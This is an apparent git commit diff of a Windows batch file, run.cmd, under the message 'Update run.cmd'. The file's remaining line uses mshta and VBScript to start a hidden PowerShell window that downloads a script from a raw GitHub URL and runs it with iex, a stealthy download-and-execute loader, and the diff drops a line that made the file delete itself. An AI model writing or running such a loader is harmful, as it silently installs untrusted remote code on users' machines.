d83a55ae29bc28b720f19e528c945867d9fc4ebd
43a1723 <hai1723notgay@gmail.com>
2024-06-14 13:06:46 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -1,2 +1,1 @@
 mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
-del /f /q "%~f0" >nul 2>&1
